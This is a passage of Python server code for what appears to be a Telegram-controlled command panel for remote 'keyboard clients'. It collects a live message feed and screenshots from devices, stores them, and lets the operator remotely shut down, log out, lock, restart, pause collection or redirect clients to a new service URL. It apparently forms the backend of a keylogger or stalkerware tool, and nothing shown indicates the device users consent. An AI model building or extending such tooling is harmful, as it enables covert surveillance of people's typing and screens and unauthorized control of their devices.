        with urllib.request.urlopen(storage_request, timeout=30) as response:
            if response.status >= 400:
                raise RuntimeError(f'Storage HTTP {response.status}')
            upload_response = response.read().decode('utf-8', errors='replace')[:500]
            print(f'Screenshot upload accepted: path={storage_path} response={upload_response}')
    except HTTPError as error:
        detail = error.read().decode('utf-8', errors='replace')[:240]
        raise RuntimeError(f'Storage HTTP {error.code}: {detail}') from error
    with psycopg.connect(state.DATABASE_URL) as connection:
        with connection.cursor() as cursor:
            cursor.execute('INSERT INTO screenshots (device_id, captured_at, storage_path) VALUES (%s, %s, %s)', (device_id, captured_at, storage_path))
state.register('save_screenshot', save_screenshot)

def screenshot_media_type(storage_path):
    return 'image/png' if str(storage_path).lower().endswith('.png') else 'image/jpeg'
state.register('screenshot_media_type', screenshot_media_type)

def telegram_controls_markup():
    rows = []
    for device in sorted(state.devices.values(), key=lambda item: str(item.get('name', ''))):
        device_id = str(device.get('id', ''))
        if not device_id:
            continue
        name = str(device.get('name', 'Unknown device'))[:20]
        rows.append([{'text': f'Shut down {name}', 'callback_data': f'control:shutdown:{device_id}'}, {'text': f'Log out {name}', 'callback_data': f'control:logout:{device_id}'}])
        rows.append([{'text': f'Restart {name}', 'callback_data': f'control:restart:{device_id}'}, {'text': f'Pause {name}', 'callback_data': f'control:pause:{device_id}'}])
    return {'inline_keyboard': rows}
state.register('telegram_controls_markup', telegram_controls_markup)

def telegram_controls_text():
    if not state.devices:
        return state.telegram_panel('CONTROLS // CLIENTS', 'No devices have checked in yet.')
    lines = ['Choose a client action below, or use:', '<code>/shutdown DEVICE_ID</code>', '<code>/logout DEVICE_ID</code>', '']
    for device in sorted(state.devices.values(), key=lambda item: str(item.get('name', ''))):
        device_id = html.escape(str(device.get('id', 'unknown')))
        name = html.escape(str(device.get('name', 'Unknown device')))
        lines.append(f'• <b>{name}</b> — <code>{device_id}</code>')
    return state.telegram_panel('CONTROLS // CLIENTS', '\n'.join(lines))
state.register('telegram_controls_text', telegram_controls_text)

def telegram_device_text(device_id):
    normalized_device_id = str(device_id).strip()
    device = state.devices.get(normalized_device_id)
    if not device:
        return state.telegram_panel('DEVICE // NOT FOUND', 'Use /devices to check the device ID.')
    now = int(time.time() * 1000)
    last_seen = int(device.get('last_seen', 0))
    online = state.device_online_states.get(normalized_device_id, now - last_seen <= state.DEVICE_OFFLINE_AFTER * 1000)
    commands = state.list_device_commands(normalized_device_id, 5)
    command_lines = '\n'.join((f"• {html.escape(str(item['command']))}: <b>{html.escape(str(item['status']))}</b>" for item in commands)) or 'No commands yet.'
    return state.telegram_panel('DEVICE // DETAIL', f"<b>NAME:</b> {html.escape(str(device.get('name', 'Unknown device')))}\n<b>ID:</b> <code>{html.escape(normalized_device_id)}</code>\n<b>STATUS:</b> {('🟢 Online' if online else '🔴 Offline')}\n<b>LAST HEARTBEAT:</b> {state.format_uptime(max(0, (now - last_seen) // 1000))} ago\n<b>USER:</b> {html.escape(str(device.get('logged_in_user', 'Unknown user')))}\n<b>BATTERY:</b> {html.escape(str(device.get('battery_status', 'Unknown')))} {device.get('battery_percent') or ''}%\n\n<b>RECENT COMMANDS</b>\n{command_lines}")
state.register('telegram_device_text', telegram_device_text)

def telegram_help_text():
    return state.telegram_panel('HELP // COMMANDS', 'Monitor your service and connected devices.\n\n<b>COMMANDS</b>\n🏠 /start — welcome screen\n📊 /status — health and uptime\n📱 /devices — device status\n🔎 /device DEVICE_ID — device detail\n🎛️ /controls — show device controls\n⏻ /shutdown DEVICE_ID — shut down a client\n🔒 /logout DEVICE_ID — log out a client\n🔁 /restart DEVICE_ID — restart a client\n🔐 /lock DEVICE_ID — lock a client\n⏸️ /pause DEVICE_ID — pause collection\n▶️ /resume DEVICE_ID — resume collection\n📸 /screenshot DEVICE_ID — request a screenshot\n📨 /messages — stored message totals\n🔗 /setsite URL — update the client service URL\n💛 /support — support options\n❓ /help — command list')
state.register('telegram_help_text', telegram_help_text)

def telegram_menu_markup():
    return {'inline_keyboard': [[{'text': 'Service status', 'callback_data': 'status'}, {'text': 'Connected devices', 'callback_data': 'devices'}], [{'text': 'Message summary', 'callback_data': 'messages'}, {'text': 'Basic controls', 'callback_data': 'controls'}], [{'text': 'Support', 'callback_data': 'support'}], [{'text': 'Help', 'callback_data': 'help'}]]}
state.register('telegram_menu_markup', telegram_menu_markup)

def telegram_messages_text():
    counts = {}
    for item in state.messages:
        device_name = str(item.get('device_name', 'Unknown device'))
        counts[device_name] = counts.get(device_name, 0) + 1
    lines = [f'<b>TOTAL STORED:</b> {len(state.messages)}']
    if counts:
        lines.append('')
        lines.append('<b>BY DEVICE</b>')
        lines.extend((f'• {html.escape(name)}: <b>{count}</b>' for name, count in sorted(counts.items())))
    else:
        lines.append('')
        lines.append('No messages stored yet.')
    return state.telegram_panel('MESSAGES // BUFFER', '\n'.join(lines))
state.register('telegram_messages_text', telegram_messages_text)

def telegram_start_text():
    return state.telegram_panel('BOOT // KEYBOARDSERVICE', '👋 Connection established.\n\nYour keyboard clients and live message feed are ready.\n\nBuilt by <b>Petroholic</b>\n\nChoose an option below.')
state.register('telegram_start_text', telegram_start_text)

def telegram_support_text():
    if state.SUPPORT_METHODS:
        lines = ['<b>SUPPORT CHANNELS</b>', '']
        for method in state.SUPPORT_METHODS:
            name = html.escape(method['name'])
            value = html.escape(method['value'])
            lines.append(f'<b>{name}</b>\n<code>{value}</code>')
        return state.telegram_panel('SUPPORT // FUND THE PROJECT', '\n\n'.join(lines))
    return state.telegram_panel('SUPPORT // FUND THE PROJECT', html.escape(state.BUY_ME_A_COFFEE_URL))
state.register('telegram_support_text', telegram_support_text)

@state.app.post('/api/devices/screenshot-status')
async def update_screenshot_status(payload: state.ScreenshotStatusInput, x_api_key: str | None=Header(default=None)):
    expected_key = os.getenv('INGEST_API_KEY')
    if expected_key and x_api_key != expected_key:
        return JSONResponse({'ok': False, 'error': 'unauthorized'}, status_code=401)
    device_id = payload.device_id.strip()
    if device_id not in state.devices:
        return JSONResponse({'ok': False, 'error': 'device not found'}, status_code=404)
    state.screenshot_statuses[device_id] = {'status': payload.status.strip() or 'Failed', 'message': payload.message.strip(), 'updated_at': int(time.time() * 1000)}
    return JSONResponse({'ok': True})
state.register('update_screenshot_status', update_screenshot_status)
